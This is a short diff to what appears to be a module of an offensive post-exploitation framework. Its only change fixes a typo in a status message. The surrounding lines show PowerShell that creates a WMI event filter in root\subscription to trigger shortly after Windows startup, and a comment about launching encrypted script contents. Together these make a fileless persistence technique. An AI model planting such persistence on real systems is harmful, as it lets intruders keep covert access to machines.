@@ -184,7 +184,7 @@ class Module:
         else:
             # create the WMI event filter for OnStartup
             script = "$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='"+subName+"';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};"
-            statusMsg += " with OnStartup WMI subsubscription trigger."
+            statusMsg += " with OnStartup WMI subscription trigger."
 
 
         # add in the event consumer to launch the encrypted script contents
